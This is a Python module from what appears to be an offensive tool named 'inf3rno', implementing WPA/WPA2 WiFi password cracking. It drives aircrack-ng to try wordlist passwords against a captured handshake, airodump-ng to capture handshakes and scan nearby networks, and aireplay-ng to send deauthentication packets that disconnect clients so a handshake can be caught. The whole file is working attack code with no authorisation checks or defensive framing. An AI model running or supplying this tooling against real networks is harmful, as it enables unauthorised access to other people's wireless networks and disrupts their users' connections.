"""WPA brute-force module."""

import os
import subprocess
from typing import Optional
from inf3rno.core.bruteforce import BaseBrute


class WPABrute(BaseBrute):
    """WPA/WPA2 brute-force implementation using aircrack-ng."""

    def __init__(self, target: str, port: int = 0, username: str = "",
                 wordlist: str = "wordlists/passwords.txt", threads: int = 1,
                 output_file: str = None, verbose: bool = False,
                 delay: float = 0.0, proxy: str = None,
                 handshake_file: str = None, interface: str = None):
        # WPA doesn't use username, only password
        super().__init__(target, port, "wpa", wordlist, threads, output_file, verbose, delay, proxy)
        self.service = "WPA"
        self.handshake_file = handshake_file
        self.interface = interface
        self.aircrack_path = self._find_aircrack()

    def _find_aircrack(self) -> Optional[str]:
        """Find aircrack-ng executable path."""
        try:
            result = subprocess.run(
                ["which", "aircrack-ng"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if result.returncode == 0:
                return result.stdout.strip()
        except Exception:
            pass

        common_paths = [
            "/usr/bin/aircrack-ng",
            "/usr/local/bin/aircrack-ng",
        ]
        for path in common_paths:
            if os.path.exists(path):
                return path

        return None

    def try_login(self, username: str, password: str) -> bool:
        """Attempt WPA crack with password."""
        if not self.aircrack_path:
            if self.verbose:
                print("[!] aircrack-ng not found")
            return False

        if not self.handshake_file:
            if self.verbose:
                print("[!] Handshake file required (--handshake)")
            return False

        if not os.path.exists(self.handshake_file):
            if self.verbose:
                print(f"[!] Handshake file not found: {self.handshake_file}")
            return False

        try:
            # Create temp file with single password
            temp_file = f"/tmp/wpa_password_{os.getpid()}.txt"
            with open(temp_file, "w") as f:
                f.write(f"{password}\n")

            # Run aircrack-ng
            cmd = [
                self.aircrack_path,
                "-w", temp_file,
                "-b", self.target,
                self.handshake_file,
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
            )

            # Clean up temp file
            os.remove(temp_file)

            # Check output for success
            output = result.stdout + result.stderr
            if "KEY FOUND" in output:
                return True
            elif "KEY NOT FOUND" in output:
                return False
            else:
                # Unknown result
                if self.verbose:
                    print(f"[!] Unknown result for {password}")
                return False

        except subprocess.TimeoutExpired:
            if self.verbose:
                print(f"[!] aircrack-ng timeout for {password}")
            return False
        except Exception as e:
            if self.verbose:
                print(f"[!] WPA error for {password}: {e}")
            return False
        finally:
            # Clean up temp file if it exists
            temp_file = f"/tmp/wpa_password_{os.getpid()}.txt"
            if os.path.exists(temp_file):
                os.remove(temp_file)

    def capture_handshake(self, interface: str = None) -> bool:
        """
        Capture WPA handshake using airodump-ng.

        Args:
            interface: Wireless interface

        Returns:
            True if handshake captured successfully
        """
        iface = interface or self.interface
        if not iface:
            print("[!] Interface required for handshake capture")
            return False

        try:
            # Start airodump-ng to capture handshake
            output_file = f"/tmp/wpa_capture_{os.getpid()}"

            cmd = [
                "airodump-ng",
                "--bssid", self.target,
                "--write", output_file,
                "--output-format", "cap",
                iface,
            ]

            print(f"[*] Capturing handshake on {iface}...")
            print("[*] Press Ctrl+C when handshake is captured")

            # Run airodump-ng (this will run until interrupted)
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            try:
                process.wait(timeout=120)  # 2 minute timeout
            except subprocess.TimeoutExpired:
                process.terminate()

            # Check if capture file exists
            cap_file = f"{output_file}-01.cap"
            if os.path.exists(cap_file):
                self.handshake_file = cap_file
                print(f"[+] Handshake captured: {cap_file}")
                return True
            else:
                print("[-] Failed to capture handshake")
                return False

        except Exception as e:
            print(f"[!] Error capturing handshake: {e}")
            return False

    def deauth_client(self, client_mac: str, interface: str = None) -> bool:
        """
        Send deauthentication packet to client.

        Args:
            client_mac: Client MAC address
            interface: Wireless interface

        Returns:
            True if deauth sent successfully
        """
        iface = interface or self.interface
        if not iface:
            print("[!] Interface required for deauth")
            return False

        try:
            cmd = [
                "aireplay-ng",
                "--deauth",
                "5",  # Number of deauth packets
                "-a", self.target,
                "-c", client_mac,
                iface,
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
            )

            if result.returncode == 0:
                print(f"[+] Deauth sent to {client_mac}")
                return True
            else:
                print(f"[-] Failed to send deauth: {result.stderr}")
                return False

        except Exception as e:
            print(f"[!] Deauth error: {e}")
            return False

    def scan_networks(self, interface: str = None) -> list:
        """
        Scan for WiFi networks.

        Args:
            interface: Wireless interface

        Returns:
            List of detected networks
        """
        iface = interface or self.interface
        if not iface:
            print("[!] Interface required for scanning")
            return []

        try:
            cmd = [
                "airodump-ng",
                "--write", "/tmp/wifi_scan",
                "--output-format", "csv",
                iface,
            ]

            print(f"[*] Scanning WiFi networks on {iface}...")
            print("[*] Press Ctrl+C after a few seconds")

            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            try:
                process.wait(timeout=10)
            except subprocess.TimeoutExpired:
                process.terminate()

            # Parse CSV output
            networks = []
            csv_file = "/tmp/wifi_scan-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, "r") as f:
                    lines = f.readlines()
                    for line in lines[2:]:  # Skip headers
                        parts = line.strip().split(",")
                        if len(parts) >= 14:
                            networks.append({
                                "bssid": parts[0].strip(),
                                "channel": parts[3].strip(),
                                "signal": parts[8].strip(),
                                "essid": parts[13].strip(),
                            })

            return networks

        except Exception as e:
            print(f"[!] Scan error: {e}")
            return []
